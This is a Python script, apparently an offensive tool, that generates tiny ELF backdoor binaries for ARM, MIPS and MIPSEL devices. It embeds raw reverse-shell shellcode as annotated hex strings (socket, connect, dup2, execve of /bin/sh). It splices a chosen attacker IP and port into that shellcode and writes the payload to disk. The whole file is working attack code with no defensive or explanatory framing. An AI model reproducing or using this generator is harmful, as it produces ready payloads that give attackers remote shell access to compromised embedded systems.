#!/usr/bin/env python

import argparse
from struct import pack

class bdcraft(object):
    armle_elf = (
        "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x02\x00\x28\x00\x01\x00\x00\x00\x54\x80\x00\x00\x34\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x00\x00"
        "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00"
        "\x00\x80\x00\x00\xef\xbe\xad\xde\xef\xbe\xad\xde\x07\x00\x00\x00"
        "\x00\x10\x00\x00"
    )
    mips_elf = (
        "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x00\x54\x00\x00\x00\x34"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00"
        "\x00\x40\x00\x00\xde\xad\xbe\xef\xde\xad\xbe\xef\x00\x00\x00\x07"
        "\x00\x00\x10\x00"
    )

    mipsel_elf = (
        "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x02\x00\x08\x00\x01\x00\x00\x00\x54\x00\x40\x00\x34\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x00\x00"
        "\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00"
        "\x00\x00\x40\x00\xef\xbe\xad\xde\xef\xbe\xad\xde\x07\x00\x00\x00"
        "\x00\x10\x00\x00"
    )

    arm = (
        "\x01\x10\x8F\xE2"
        "\x11\xFF\x2F\xE1"
        "\x02\x20\x01\x21"
        "\x92\x1A\x0F\x02"
        "\x19\x37\x01\xDF"
        "\x06\x1C\x08\xA1"
        "\x10\x22\x02\x37"
        "\x01\xDF\x3F\x27"
        "\x02\x21\x30\x1c"
        "\x01\xdf\x01\x39"
        "\xFB\xD5\x05\xA0"
        "\x92\x1a\x05\xb4"
        "\x69\x46\x0b\x27"
        "\x01\xDF\xC0\x46"
        "\x02\x00\x12\x34"  # struct sockaddr port: \x1234
        "\x0A\x00\x02\x02"  # port: \x1234
        "\x2f\x62\x69\x6e" # /bin
        "\x2f\x73\x68\x00" # /sh\0
    )

    mipsel = (
        # <_ftext>:
        "\xff\xff\x04\x28"  # slti    a0,zero,-1
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x11\x11\x04\x28"  # slti    a0,zero,4369
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xfd\xff\x0c\x24"  # li      t4,-3
        "\x27\x20\x80\x01"  # nor     a0,t4,zero
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xfd\xff\x0c\x24"  # li      t4,-3
        "\x27\x20\x80\x01"  # nor     a0,t4,zero
        "\x27\x28\x80\x01"  # nor     a1,t4,zero
        "\xff\xff\x06\x28"  # slti    a2,zero,-1
        "\x57\x10\x02\x24"  # li      v0,4183
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xff\xff\x44\x30"  # andi    a0,v0,0xffff
        "\xc9\x0f\x02\x24"  # li      v0,4041
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xc9\x0f\x02\x24"  # li      v0,4041
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x7a\x69\x05\x3c"  # lui     a1,0x697a
        "\x02\x00\xa5\x34"  # ori     a1,a1,0x2
        "\xf8\xff\xa5\xaf"  # sw      a1,-8(sp)
        "\x00\x01\x05\x3c"  # lui     a1,0x100
        "\x7f\x00\xa5\x34"  # ori     a1,a1,0x7f
        "\xfc\xff\xa5\xaf"  # sw      a1,-4(sp)
        "\xf8\xff\xa5\x23"  # addi    a1,sp,-8
        "\xef\xff\x0c\x24"  # li      t4,-17
        "\x27\x30\x80\x01"  # nor     a2,t4,zero
        "\x4a\x10\x02\x24"  # li      v0,4170
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x62\x69\x08\x3c"  # lui     t0,0x6962
        "\x2f\x2f\x08\x35"  # ori     t0,t0,0x2f2f
        "\xec\xff\xa8\xaf"  # sw      t0,-20(sp)
        "\x73\x68\x08\x3c"  # lui     t0,0x6873
        "\x6e\x2f\x08\x35"  # ori     t0,t0,0x2f6e
        "\xf0\xff\xa8\xaf"  # sw      t0,-16(sp)
        "\xff\xff\x07\x28"  # slti    a3,zero,-1
        "\xf4\xff\xa7\xaf"  # sw      a3,-12(sp)
        "\xfc\xff\xa7\xaf"  # sw      a3,-4(sp)
        "\xec\xff\xa4\x23"  # addi    a0,sp,-20
        "\xec\xff\xa8\x23"  # addi    t0,sp,-20
        "\xf8\xff\xa8\xaf"  # sw      t0,-8(sp)
        "\xf8\xff\xa5\x23"  # addi    a1,sp,-8
        "\xec\xff\xbd\x27"  # addiu   sp,sp,-20
        "\xff\xff\x06\x28"  # slti    a2,zero,-1
        "\xab\x0f\x02\x24"  # li      v0,4011
        "\x0c\x09\x09\x01"  # syscall 0x42424
    )

    mips = (
        # <_ftext>:
        "\x28\x04\xff\xff"  # slti     a0,zero,-1
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x28\x04\x11\x11"  # slti     a0,zero,4369
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x0c\xff\xfd"  # li       t4,-3
        "\x01\x80\x20\x27"  # nor      a0,t4,zero
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x0c\xff\xfd"  # li       t4,-3
        "\x01\x80\x20\x27"  # nor      a0,t4,zero
        "\x01\x80\x28\x27"  # nor      a1,t4,zero
        "\x28\x06\xff\xff"  # slti     a2,zero,-1
        "\x24\x02\x10\x57"  # li       v0,4183
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x30\x44\xff\xff"  # andi     a0,v0,0xffff
        "\x24\x02\x0f\xc9"  # li       v0,4041
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x02\x0f\xc9"  # li       v0,4041
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x3c\x05\x00\x02"  # lui      a1,0x2
        "\x34\xa5\x7a\x69"  # ori      a1,a1,0x7a69
        "\xaf\xa5\xff\xf8"  # sw       a1,-8(sp)
        "\x3c\x05\xc0\xa8"  # lui      a1,0xc0a8
        "\x34\xa5\x01\x37"  # ori      a1,a1,0x137
        "\xaf\xa5\xff\xfc"  # sw       a1,-4(sp)
        "\x23\xa5\xff\xf8"  # addi     a1,sp,-8
        "\x24\x0c\xff\xef"  # li       t4,-17
        "\x01\x80\x30\x27"  # nor      a2,t4,zero
        "\x24\x02\x10\x4a"  # li       v0,4170
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x3c\x08\x2f\x2f"  # lui      t0,0x2f2f
        "\x35\x08\x62\x69"  # ori      t0,t0,0x6269
        "\xaf\xa8\xff\xec"  # sw       t0,-20(sp)
        "\x3c\x08\x6e\x2f"  # lui      t0,0x6e2f
        "\x35\x08\x73\x68"  # ori      t0,t0,0x7368
        "\xaf\xa8\xff\xf0"  # sw       t0,-16(sp)
        "\x28\x07\xff\xff"  # slti     a3,zero,-1
        "\xaf\xa7\xff\xf4"  # sw       a3,-12(sp)
        "\xaf\xa7\xff\xfc"  # sw       a3,-4(sp)
        "\x23\xa4\xff\xec"  # addi     a0,sp,-20
        "\x23\xa8\xff\xec"  # addi     t0,sp,-20
        "\xaf\xa8\xff\xf8"  # sw       t0,-8(sp)
        "\x23\xa5\xff\xf8"  # addi     a1,sp,-8
        "\x27\xbd\xff\xec"  # addiu    sp,sp,-20
        "\x28\x06\xff\xff"  # slti     a2,zero,-1
        "\x24\x02\x0f\xab"  # li       v0,4011
        "\x00\x90\x93\x4c"  # syscall  0x2424d
    )

    def __init__(self, arch, ip, port):
        self.arch = arch
        self.ip = ip
        self.port = port

    def convert_ip(self, addr):
        res = ""
        for i in addr.split("."):
            res += chr(int(i))
        return res

    def convert_port(self, p):
        res = "%.4x" % int(p)
        return res.decode('hex')

    def generate_binary(self):
        ip = self.convert_ip(self.ip)
        port = self.convert_port(self.port)

        revshell = None

        if self.arch == 'arm':
            shellcode = (self.arm[:0x3a] +
                         port +
                         ip +
                         self.arm[0x40:])

            elf = self.armle_elf + shellcode
            p_filesz = pack("<L", len(elf))
            p_memsz = pack("<L", len(elf) + len(shellcode))

        elif self.arch == 'mipsel':
            shellcode= (self.mipsel[:0x54] +
                        port +
                        self.mipsel[0x56:0x60] +
                        ip[2:] +
                        self.mipsel[0x62:0x64] +
                        ip[:2] +
                        self.mipsel[0x66:])

            elf = self.mipsel_elf + shellcode
            p_filesz = pack("<L", len(elf))
            p_memsz = pack("<L", len(elf) + len(shellcode))

        elif self.arch == 'mips':
            shellcode = (self.mips[:0x5a] +
                         port + self.mips[0x5c:0x62] +
                         ip[:2] +
                         self.mips[0x64:0x66] +
                         ip[2:] +
                         self.mips[0x68:])

            elf = self.mips_elf + shellcode
            p_filesz = pack(">L", len(elf))
            p_memsz = pack(">L", len(elf) + len(shellcode))

        else:
            print("Platform not supported")
            return

       
        revshell = elf[:0x44] + p_filesz + p_memsz + elf[0x4c:]
        return revshell


def main():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('--arch', help='Architecture: mips, mipsel, arm', required=True)
    parser.add_argument('--ip', help='IP address for reverse shell', required=True)
    parser.add_argument('--port', help='Port number for reverse shell', required=True)

    args = parser.parse_args()

    print(("Architecture: {}\n"
           "IP: {}\n"
           "Port: {}\n"
           "-----------------").format(args.arch, args.ip, args.port))

    r = bdcraft(args.arch, args.ip, args.port)
    content = r.generate_binary()
    path = "output/bd"

    print(("Length: {}\n"
           "Saving to: {}\n").format(len(content), path))

    with open(path, 'wb+') as f:
        f.write(content)
        f.close()


if __name__ == '__main__':
    main()
